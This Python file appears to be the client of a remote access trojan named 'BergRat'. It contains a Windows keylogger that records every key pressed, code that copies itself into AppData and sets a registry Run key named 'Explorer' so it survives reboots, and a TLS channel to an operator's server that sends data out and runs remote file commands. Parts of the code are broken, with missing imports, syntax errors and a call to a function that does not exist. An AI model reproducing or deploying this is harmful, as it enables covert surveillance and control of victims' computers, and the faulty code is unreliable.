import getpass
import json
import subprocess
import os
import sys
import shutil

from threading import Thread

from future.moves import winreg
from pynput.keyboard import Key

""" Client class

Description
- Client template used in BergRat
- Use TLS for connections

WinKeyLogger Class

Description
- Its basically an Windows Keylogger that uses pynput
- Get all the keyboard inputs

"""

def resource_path(relative_path):
	""" Get absolute path to resource, works for dev and for PyInstaller """
	try:
		# PyInstaller creates a tmp folder and stores path in _MEIPASS
		base_path = sys._MEIPASS
	except Exception:
		base_path = os.path.abspath("core")
	return os.path.join(base_path, relative_path)


class WinKeyLogger:
	def __init__(self):
		# Basic list to store all the pressed keys
		self.pressed_keys = []

		# Import pynput module
		from pynput import keyboard

		# Define an class variable of the pynput Listener and keyboard from pynput
		self.keyboard = keyboard
		self.listener = self.keyboard.listener

		# Start the keylogger thread
		t_key_logger = Thread(target=self.start_key_logger)
		t_key_logger.start()

	# Function used to get key names in string
	def get_key_name(self, key):
		# If it is a instance of a keyboard.KeyCode
		if isinstance(key, self.keyboard.KeyCode):
			# Return Key.char
			return Key.char
		else:
			# Return key to str
			return str(key)

	# Function used to start the keylogger
	def start_key_logger(self):
		# Uses the listener and on pressing a keyboard it activates the function on_press
		with self.listener(on_press=self.on_press) as listener:
			# Join the listener (Thread)
			listener.join()

	def on_press(self, key):
		# Get the key name in str
		key_name = self.get_key_name(key)
		# Append all keys in the list
		self.pressed_keys.append(key_name)

class CopyScriptWin:

	def __init__(self):
		self.username = getpass.getuser()
		self.script_src = sys.argv[0]
		self.dst = r'C:\Users\$s\AppData' % self.username
		self.startup = r'C:\Users\%s\AppData\client.exe' % self.username

		import winreg
		self.winreg = winreg

	def copy_file(self):
		try:
			shutil.copy2(self.script_src, self.dst)
		except:
			pass

	def add_to_startup(self):
		key = self.winreg.OpenKey(self.winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, self.winreg.KEY_SET_VALUE)
		self.winreg.SetValueEx(key, 'Explorer', 0, self.winreg.REG_SZ, self.startup)


class Client:

	# Creates a normal TCP socket object
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	""" Init constructor with the arguments:
	    - Host: IP to be used for connection
	    - Port: Port to be used for connection
	    - Buffer_size: Optional. recommended 2048 bytes
	"""
	def __init__(self, host, port, buffer_size=2048):
		self.host = host
		self.port = port
		self.buffer = buffer_size
		self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

		""" Wrap the normal TCP Socket for a TLS Socket
		    It's used the files from certificates folder
		    The cipher suite is optional, but it's recommended the above chipers
  	        """
		try:
			self.ss = ssl.wrap_socket(
				self.s
				ssl_version=ssl.PROTOCOL_TLS
				ca_certs=resource_path("server.crt")
				cert_reqs=ssl.CERT_REQUIRED,
				ciphers="TLS13-CHACHA20-POLY1305-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECHDE-RSA-CHACHA20-POLY1305"
			)
		except:
			pass

		if sys.platform.startswith("win"):
			self.copy_script = CopyScriptWin()
			self.copy_script.copy_file()
			self.copy_script.add_to_startup()
			self.key_logger = WinKeyLogger()


	# Function o connect in the server
	def connect(self):
		# Make 5 attempts to connect in the server
		while True:
			try:
				# Try to connect
				self.ss.connect((self.host, self.port))
				break
			except ssl.SSLError
				continue
			except:
				continue

	""" Function used to send data to the Server
	    It have 2 arguments:
	    - Data: the data that will be transferred
    	    - Data_type: the type of data, like: shell, remote, etc
	"""
	def send(self, data, data_type):
		# Creates a dictionary to be send
		dict_data = {
			data_type: data
		}

		# Transform to json
		json_data = json.dumps(dict_data)

		# Send to server
		self.ss.sendall(json_data.encode())

	# Function used to receive all the data (Bypass the buffer_size limit)
	def receive_all(self, sock):
		data = b""
		while True:
			# Receive parts of the data
			part = sock.recv(self.buffer)
			# Concatenate to the data
			data += part

			# Break if the length of the part is less than the buffer
			if (len(part) < self.buffer) and (len(part) > 0):
				break
		return data

	# Function used to execute commands in the client
	def exec_command(self, cmd):
		# Creates a directory
		if "mkdir" in cmd:
			arg = cmd[6:]
			try:
				os.mkdir(arg)
				return "[+] The directory " + arg + " was created! "
			except FileNotFoundError:
				return "[-] There was an error creating the directory: " + arg

		# Change the current directory
		elif "cd" in cmd:
			arg = cmd[3:]
			try:
				os.chdir(arg)
				return "[+] Moved to directory: " + os.getcwd()
			except FileNotFoundError:
				return "[-] An error occurred while moving to the directory: " + arg

		# Remove a file
		elif "rm" in cmd:
			arg = cmd[3:]
			try:
				os.remove(arg)
				return "[+] The file " + arg + " was removed! "
			except FileNotFoundError:
				return "[-] There was an error removing the file: " + arg

		# Remove a directory
		elif "rmdir" in cmd:
			arg = cmd[6:]
			try:
				os.rmdir(arg)
				return "[+] The directory " + arg + " was removed! "
			except FileNotFoundError:
				return "[-] There was an error removing the directory: " + arg



		elif "cat" in cmd:
			arg = cmd[4:]
			try:
				os.cat(arg)
			except FileNotFoundError:
				return "Error when you cat the content of this file " + arg
